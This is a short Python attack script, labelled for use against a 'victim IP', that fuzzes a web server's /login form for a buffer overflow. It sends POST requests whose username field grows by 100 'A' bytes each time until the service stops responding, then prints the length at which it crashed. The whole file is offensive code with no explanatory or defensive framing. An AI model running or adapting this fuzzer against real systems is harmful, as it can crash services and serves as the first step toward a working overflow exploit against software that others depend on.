#!/bin/python3

#Rem01x
import socket
import time
import sys

#Change This To You Victim IP

target = "192.168.2.15"

port = 80

timeout = 5

buffer = b"A" * 100
exploit = b"" 
while True:
    try:
        exploit = b"username=" + buffer + b"&password=admin"
        print("Fuzzing {} Bytes".format(str(len(exploit))))
        req = b""
        req += b"POST /login HTTP/1.1\r\n"
        req += b"Host: 192.168.2.15\r\n"
        req += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
        req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        req += b"Accept-Language: en-US,en;q=0.5\r\n"
        req += b"Accept-Encoding: gzip, deflate\r\n"
        req += b"Content-Type: application/x-www-form-urlencoded\r\n"
        req += b"Content-Length: " + str(len(exploit)).encode() + b"\r\n"
        req += b"Origin: http://192.168.2.15\r\n"
        req += b"Connection: close\r\n"
        req += b"Referer: http://192.168.2.15/login\r\n"
        req += b"Upgrade-Insecure-Requests: 1\r\n"
        req += b"\r\n"
        req += exploit
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target,port))
        s.send(req)
        s.recv(1024)
        s.close()
    except:
        print("[!] Error at {} Byte".format(str(len(exploit))))
        sys.exit(0)
    buffer += b"A" * 100
    time.sleep(1)
